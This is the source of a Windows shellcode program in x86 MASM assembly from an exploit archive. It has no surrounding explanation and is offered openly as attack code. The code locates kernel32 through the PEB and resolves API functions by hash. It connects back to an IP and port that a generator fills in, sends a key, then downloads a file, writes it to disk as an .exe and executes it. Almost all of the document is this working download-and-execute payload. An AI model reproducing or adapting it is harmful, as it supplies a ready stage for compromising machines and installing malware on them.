;
; link  -  connectback, receive, save and execute shellcode
;
; Copyright (c) 2004 by loco
; All Rights Reserved
;
; NOTE: Compatible with Windows NT based operating systems. IPv4 only.
;
;

  .386
  .model flat, stdcall
   option casemap:none
   assume fs:flat

   include C:\masm32\include\windows.inc   ; standard windows header
   include C:\masm32\include\kernel32.inc  ; definitions of kernel32.dll

   includelib C:\masm32\lib\kernel32.lib   ; we must have kernel32.dll in our process if we want to test it

  .data

   dd GetTickCount ; refer to GetTickCount so that kernel32.dll gets loaded into our process

  .code

   db 'START->'    ; start of shellcode (makes copy n pasting easier later)

; *** stuff that makes our life easier *****************************************

   ; kernel32.dll
   __imp_ExitThread  equ dword ptr [ebp + 04h]
   __imp_LoadLibrary equ dword ptr [ebp + 08h]
   ; msvcrt.dll
   __imp_fopen       equ dword ptr [ebp + 0ch]
   __imp_fwrite      equ dword ptr [ebp + 10h]
   __imp_fclose      equ dword ptr [ebp + 14h]
   __imp__execv      equ dword ptr [ebp + 18h]
   ; ws2_32.dll
   __imp_WSAStartup  equ dword ptr [ebp + 1ch]
   __imp_socket      equ dword ptr [ebp + 20h]
   __imp_connect     equ dword ptr [ebp + 24h]
   __imp_recv        equ dword ptr [ebp + 28h]
   __imp_send        equ dword ptr [ebp + 2ch]
   __imp_closesocket equ dword ptr [ebp + 30h]

; *** GetImportAddress macro ***************************************************

GetImportAddress MACRO
   LOCAL GetImportAddressLoop
   LOCAL GetImportHashLoop

   mov   edx, dword ptr [edi + 3ch]       ; get offset of PE header
   mov   edx, dword ptr [edi + edx + 78h] ; get RVA of export directory
   add   edx, edi                         ; convert it to pointer
   push  edx                              ; save it to stack

   mov   edx, [edx + 20h]                 ; get rva of rva's of names
   add   edx, edi                         ; convert it to pointer

   xor   ebx, ebx                         ; index of ordinal will be saved in ebx
GetImportAddressLoop:
   inc   ebx                              ; just skip the first entry
   mov   esi, [edx + ebx * 04h]           ; get rva of name
   add   esi, edi                         ; convert it to pointer
   xor   ecx, ecx
   lodsb                                  ; mov al, byte ptr [esi] -> inc esi
GetImportHashLoop:
   xor   cl, al
   rol   ecx, 5
   lodsb                                  ; mov al, byte ptr [esi] -> inc esi
   test  al, al
   jnz   GetImportHashLoop

   mov   esi, [ebp]                       ; get index of current function
   sub   ecx, [ebp + esi * 04h]           ; sub the original hash from current
   jnz   GetImportAddressLoop             ; not equal? try next

   xchg  esi, [esp]                       ; pointer to export table in esi now
   mov   edx, [esi + 24h]                 ; get rva of array of ordinals
   add   edx, edi                         ; convert it to pointer
   mov   cx, [edx + ebx * 2]              ; get ordinal

   mov   edx, [esi + 1ch]                 ; get rva of array of pointers to functions
   add   edx, edi                         ; convert it to pointer

   mov   eax, [edx + ecx * 4]             ; get rva of function
   add   eax, edi                         ; convert it to pointer
   pop   esi                              ; index of current function in esi
   mov   [ebp + esi * 04h], eax           ; move pointer to correct entry
   inc   dword ptr [ebp]                  ; increment index of current function
ENDM

start:
; *** find kernel32.dll base ***************************************************

   xor   ebx, ebx
   mov   eax, fs:[ebx + 30h]    ; Extract the PEB
   mov   eax, [eax + 0ch]       ; Extract the PROCESS_MODULE_INFO pointer from the PEB
   mov   esi, [eax + 1ch]       ; Get the address of flink in the init module list
   lodsd                        ; Load the address of blink into eax
   mov   eax, [eax + 08h]       ; Grab the module base address from the list entry

; *** load the imports *********************************************************

   push  ebx         ; 0
   push  ebx         ; 0
   push  '23'        ; ????32 first part of ws2_32
   push  '_2sw'      ; ws2_?? second part of ws2_32
   push  'tr'        ; ????rt first part of msvcrt
   push  'cvsm'      ; msvc?? second part of msvcrt
   call  OverImportHashes
   dd 1
   ; kernel32.dll
   dd 0D6086235h ; ExitThread
   dd 094202374h ; LoadLibrary
   ; msvcrt
   dd 0CAC999C0h ; fopen
   dd 069155CB9h ; fwrite
   dd 040F640B9h ; fclose
   dd 00DB302D7h ; _execv
   ; ws2_32.dll
   dd 0C44DF985h ; WSAStartup
   dd 018041A9Ch ; socket
   dd 01AD30183h ; connect
   dd 0071302C0h ; recv
   dd 007033480h ; send
   dd 028398AB4h ; closesocket
OverImportHashes:
   pop   ebp
   push  2
   pop   ebx
GetImportAddressOfNextDll:
   mov   edi, eax
   push  ebx
GetImportAddressesLoop:
   push  ebx
   GetImportAddress
   pop   ebx
   dec   ebx
   jnz   GetImportAddressesLoop

   pop   ebx
   add   ebx, 2
   push  esp                   ; push modulehandle
   call  dword ptr [ebp + 08h] ; call kernel32.LoadLibraryA
   add   esp, 8                ; next module
   test  eax, eax
   jnz   GetImportAddressOfNextDll

   mov   ah, 02h               ; eax = 00000200
   sub   esp, eax

; *** connect to IP ************************************************************

   mov   al, ah                ; eax = 00000202

   ; initialize ws2_32.dll
   push  esp                   ; our receive buffer (abused as WSADATA struct)
   push  eax                   ; we support 2.2 and above
   call  __imp_WSAStartup      ; when call succesful, will return 0

   ; set up SOCKADDR_IN structure
   push  eax                   ; 0
   push  eax                   ; 0
   push  11111111h             ; ip (will be set by shellcode generator)
   push  22220002h             ; AF_INET & port (port will be set by shellcode generator)
   mov   edi, esp

   push  eax                   ; IPPROTO_IP
   push  1                     ; SOCK_STREAM
   push  2                     ; AF_INET
   call  __imp_socket          ; call ws2_32.socket
   mov   ebx, eax

   ; call it
   push  10h                   ; sizeof SOCKADDR_IN
   push  edi                   ; ptr SOCKADDR_IN
   push  ebx                   ; socket
   call  __imp_connect         ; call ws2_32.connect
   ; the only check!
   test  eax, eax
   jnz   Exit

; *** send the request key *****************************************************

   mov   dword ptr [ebp], 33333333h ; request key (will be set by shellcode generator)

   push  eax                        ; flags (0)
   push  4                          ; length (4)
   push  ebp                        ; buffer
   push  ebx                        ; socket
   call  __imp_send                 ; call ws2_32.send

; *** receive file *************************************************************

   mov   esi, esp                    ; save pointer to buffer in esi

   ; we want read/write access
   mov   dword ptr [ebp], 'bw'
   push  'exe'                       ; second part 0, 'exe'
   push  '.xxx'                      ; first part '.xxx' (will be set by generator)
   mov   edi, esp                    ; save filename in edi
   push  ebp                         ; push pointer to 'wb'
   push  edi                         ; push pointer to filename
   call  __imp_fopen                 ; call msvrt.fopen
   mov   [ebp], eax                  ; move FILE stream in esi
   ; add   esp, 8                    ; no need to clean stack

   ; receive loop
ReceiveFile:
   push  0                     ; flags
   push  512                   ; buffersize
   push  esi                   ; buffer
   push  ebx                   ; socket
   call  __imp_recv            ; call ws2_32.recv
   test  eax, eax
   jz    DoneReceiving
   js    Exit

   push  [ebp]                 ; FILE
   push  eax                   ; nitems
   push  1                     ; item size
   push  esi                   ; buffer
   call  __imp_fwrite          ; call msvcrt.fwrite
   add   esp, 10h              ; clean stack

   jmp   ReceiveFile

DoneReceiving:
   push  [ebp]         ; push FILE stream to close
   call  __imp_fclose  ; call msvcrt.fclose, returns 0 if succesful
   ; add   esp, 4      ; not needed to clean stack

   push  eax
   push  esp           ; varguments
   push  edi           ; filename
   call  __imp__execv  ; call msvcrt._execv
   ; add   esp, 8      ; not needed to clean stack

Exit:
   push  ebx                                ; socket
   call  __imp_closesocket                  ; call ws2_32.closesocket

   ; push  0                                ; we don't care about the exit code
   call  __imp_ExitThread                   ; call kernel32.ExitThread

; ******************************************+**********************************
   db '<-END'                 ; end of shellcode
; ******************************************+**********************************

end start

; milw0rm.com [2008-08-25]